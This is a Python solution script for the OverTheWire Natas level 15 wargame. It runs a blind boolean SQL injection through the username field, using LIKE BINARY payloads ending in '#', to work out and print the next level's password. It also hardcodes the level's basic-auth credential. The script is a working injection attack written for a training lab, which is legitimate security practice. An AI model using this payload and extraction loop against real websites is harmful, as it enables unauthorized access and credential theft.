import requests
from requests.auth import HTTPBasicAuth


alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
char_filtered = ''
pwd = ''
basic_auth = HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'


def create_payload(c) -> dict:
    value = f'natas16" and password LIKE BINARY "%{c}%"#'
    return {'username': value}


# filter char exist in password string
for i in alphabet:
    res = requests.post(url, auth=basic_auth, data=create_payload(i))
    if 'This user exists' in res.text:
        char_filtered += i


for i in range(0, 32):
    for i in char_filtered:
        value = f'natas16" and password LIKE BINARY "{pwd}{i}%"#'
        payload = {'username': value}
        res = requests.post(url, auth=basic_auth, data=payload)
        if 'This user exists' in res.text:
            pwd += i
            break


print(f'password: {pwd}')
